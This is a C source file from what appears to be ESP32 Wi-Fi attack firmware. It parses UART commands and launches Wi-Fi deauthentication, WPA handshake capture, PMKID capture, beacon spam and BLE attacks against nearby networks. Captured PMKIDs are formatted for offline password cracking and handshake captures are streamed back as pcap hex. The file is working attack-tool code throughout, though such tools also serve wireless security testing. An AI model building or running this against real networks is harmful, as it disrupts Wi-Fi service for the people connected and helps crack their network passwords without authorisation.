#include "driver/uart.h"
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"
#include "webserver.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>
#include "pcap_serializer.h"
#include "spam_attack.h"
#include "ble_hidd_demo.h"

#include "wifi_controller.h"
#include "attack.h"

static const char* TAG = "webserver";
#define UART_NUM UART_NUM_1  // Выбранный UART порт для ESP32
#define BUF_SIZE (1024)      // Размер буфера

#define TX_PIN 16  // Укажите TX пин ESP32
#define RX_PIN 17
ESP_EVENT_DEFINE_BASE(WEBSERVER_EVENTS);
char pmkid1[256];

static void handle_attack_command(const char *command, attack_type_t type, const char *data) {
    char *id_str = strstr(data, "ID: ");
    char *time_str = strstr(data, "Time: ");
    int id = 0, time = 0;

    if (id_str && time_str) {
        int parsed_id = sscanf(id_str, "ID: %d", &id);
        int parsed_time = sscanf(time_str, "Time: %d", &time);

        if (parsed_id == 1 && parsed_time == 1) {
            ESP_LOGI(TAG, "Parsed ID: %d, Time: %d", id, time);
            attack_request_t attack_request = {
                .type = type,
                .ap_record_id = id,
                .timeout = time
            };
            ESP_ERROR_CHECK(esp_event_post(WEBSERVER_EVENTS, WEBSERVER_EVENT_ATTACK_REQUEST, &attack_request, sizeof(attack_request_t), portMAX_DELAY));
        } else {
            ESP_LOGE(TAG, "Error parsing values for %s command", command);
        }
    } else {
        ESP_LOGE(TAG, "Error: ID or Time not found in %s command", command);
    }
}

static void handle_spam_command(const char *command, const char *data) {
    char *time_str = strstr(data, "Time: ");
    int time = 0;

    if (time_str) {
        int parsed_time = sscanf(time_str, "Time: %d", &time);

        if (parsed_time == 1) {
            ESP_LOGI(TAG, "Time: %d", time);
            start_spam(time);
        } else {
            ESP_LOGE(TAG, "Error parsing values for %s command", command);
        }
    } else {
        ESP_LOGE(TAG, "Error: Time not found in %s command", command);
    }
}

void handle_BLE_command(const char *command, const char *data) {
    char *time_str = strstr(data, "Time: ");
    int time = 0;

    if (time_str) {
        int parsed_time = sscanf(time_str, "Time: %d", &time);

        if (parsed_time == 1) {
            ESP_LOGI(TAG, "Time: %d", time);
            start_code(time);
        } else {
            ESP_LOGE(TAG, "Error parsing values for %s command", command);
        }
    } else {
        ESP_LOGE(TAG, "Error: Time not found in %s command", command);
    }
}


void uint8_to_hex(uint8_t value, char *out) {
    sprintf(out, "%02x", value);
}

void result_pmkid(char *attack_content, uint16_t attack_content_size) {
    vTaskDelay(1000 / portTICK_PERIOD_MS);
    char mac_ap[13] = {0};
    char mac_sta[13] = {0};
    char ssid_hex[65] = {0};
    char ssid_text[33] = {0};
    char pmkid[100] = {0};
    size_t index = 0;
    if (attack_content == NULL) {
        ESP_LOGE(TAG, "attack_content is NULL");
        return;
    }

    if (attack_content_size < 6) {
        ESP_LOGE(TAG, "Not enough data for MAC AP!");
        return;
    }

    for (int i = 0; i < 6; i++) {
        uint8_to_hex(attack_content[index + i], &mac_ap[i * 2]);
    }
    index += 6;

    for (int i = 0; i < 6; i++) {
        uint8_to_hex(attack_content[index + i], &mac_sta[i * 2]);
    }
    index += 6;

    uint8_t ssid_length = attack_content[index];
    index += 1; 
    for (int i = 0; i < ssid_length; i++) {
        uint8_to_hex(attack_content[index + i], &ssid_hex[i * 2]);
        ssid_text[i] = (char)attack_content[index + i];
    }
    ssid_text[ssid_length] = '\0';
    index += ssid_length;

    int pmkid_count = 0;
    size_t pmkid_offset = 0;
    for (size_t i = 0; i < attack_content_size - index; i++) {
        if (i % 16 == 0) {
            pmkid_offset += sprintf(&pmkid[pmkid_offset], "\nPMKID #%d: ", pmkid_count);
            pmkid_count++;
        }
        pmkid_offset += sprintf(&pmkid[pmkid_offset], "%02x", attack_content[index + i]);
    }

    snprintf(pmkid1, sizeof(pmkid1) - 1, "PMKID: %s*%s*%s*%s", pmkid, mac_ap, mac_sta, ssid_hex);
    size_t len = strlen(pmkid1);
    size_t offset = 0;
    while (len > offset) {
        size_t chunk_size = (len - offset > BUF_SIZE) ? BUF_SIZE : len - offset;
        uart_write_bytes(UART_NUM, &pmkid1[offset], chunk_size);
        offset += chunk_size;
    }
}

void result_handshake(char *attack_content, uint16_t attack_content_size) {
    if (attack_content == NULL) {
        ESP_LOGE(TAG, "attack_content is NULL");
        return;
    }

    char line[256] = "PCAP";
    size_t line_offset = 4;

    ESP_LOGI(TAG, "Handshake Data:");
    for (size_t i = 0; i < attack_content_size; i++) {
        char hex[3];
        uint8_to_hex(attack_content[i], hex);

        line_offset += sprintf(&line[line_offset], "%s", hex);

        if ((i + 1) % 50 == 0 || i == attack_content_size - 1) {
            line[line_offset] = '\0';
            ESP_LOGI(TAG, "%s", line);
            uart_write_bytes(UART_NUM, line, strlen(line));
            line_offset = 4;
            line[4] = '\0';
        }
    }
}

void get_status() {
    vTaskDelay(1000 / portTICK_PERIOD_MS);  // Задержка 9 секунд
    attack_status_t *attack_status = attack_get_status();

    while (attack_status->state == RUNNING) {
        vTaskDelay(1000 / portTICK_PERIOD_MS);
        attack_status = attack_get_status();
        ESP_LOGI(TAG, "Updated attack status: %d", attack_status->state);
    }

    // Если атака завершена или произошел таймаут, обрабатываем результаты
    if ((attack_status->state == FINISHED) || (attack_status->state == TIMEOUT)) {
        switch (attack_status->type) {
            case 0:
                ESP_LOGI(TAG, "Processing handshake results...");
                result_handshake((char *)pcap_serializer_get_buffer(), pcap_serializer_get_size());
                attack_status->type = -1;
                vTaskDelay(2000 / portTICK_PERIOD_MS);
                break;
            case 1:
                ESP_LOGI(TAG, "Processing PMKID results...");
                result_pmkid(attack_status->content, attack_status->content_size);
                attack_status->type = -1;
                vTaskDelay(3000 / portTICK_PERIOD_MS);
                break;
            default:
                break;
        }
        return;
    }
}

void uart_task() {
    uart_config_t uart_config = {
        .baud_rate = 115200,
        .data_bits = UART_DATA_8_BITS,
        .parity    = UART_PARITY_DISABLE,
        .stop_bits = UART_STOP_BITS_1,
        .flow_ctrl = UART_HW_FLOWCTRL_DISABLE
    };

    uart_param_config(UART_NUM, &uart_config);
    uart_set_pin(UART_NUM, TX_PIN, RX_PIN, UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE);
    uart_driver_install(UART_NUM, BUF_SIZE * 2, 0, 0, NULL, 0);
    uint8_t data[BUF_SIZE];

    while (1) {
        get_status();

        int len = uart_read_bytes(UART_NUM, data, BUF_SIZE - 1, 20 / portTICK_PERIOD_MS); // 20ms timeout
        if (len > 0) {
            data[len] = '\0';
            ESP_LOGI(TAG, "Received: %s", data);

            if (strncmp((char *)data, "Scan\n", len) == 0) {
                const wifictl_ap_records_t *ap_records;
                wifictl_scan_nearby_aps();
                ap_records = wifictl_get_ap_records();
                char full_resp[1024] = {0}; // Increase buffer size if necessary
                size_t offset = 0;

                for (unsigned i = 0; i < ap_records->count; i++) {
                    if (i == ap_records->count - 1) {
                        offset += snprintf(
                            full_resp + offset,
                            sizeof(full_resp) - offset,
                            "%s\n\r",
                            ap_records->records[i].ssid
                        );
                    } else {
                        offset += snprintf(
                            full_resp + offset,
                            sizeof(full_resp) - offset,
                            "%s\n",
                            ap_records->records[i].ssid
                        );
                    }
                }

                uart_write_bytes(UART_NUM, full_resp, strlen(full_resp));

            } else if (strncmp((char *)data, "Deauth", 6) == 0) {
                ESP_LOGI(TAG, "Received Deauth command");
                handle_attack_command("Deauth", ATTACK_TYPE_DOS, (char *)data);
            } else if (strncmp((char *)data, "Handshake", 9) == 0) {
                ESP_LOGI(TAG, "Received Handshake command");
                handle_attack_command("Handshake", ATTACK_TYPE_HANDSHAKE, (char *)data);
            } else if (strncmp((char *)data, "Pmkid", 5) == 0) {
                ESP_LOGI(TAG, "Received Pmkid command");
                handle_attack_command("Pmkid", ATTACK_TYPE_PMKID, (char *)data);
            }else if (strncmp((char *)data, "Spam", 4) == 0) {
                ESP_LOGI(TAG, "Received Spam command");
                handle_spam_command("Spam", (char *)data);
            }else if (strncmp((char *)data, "BLE", 3) == 0) {
                ESP_LOGI(TAG, "Received BLE command");
                handle_BLE_command("BLE", (char *)data);
            }
        }
    }
}

void webserver_run(){
    xTaskCreate(uart_task, "uart_task", 8192, NULL, 5, NULL);
}
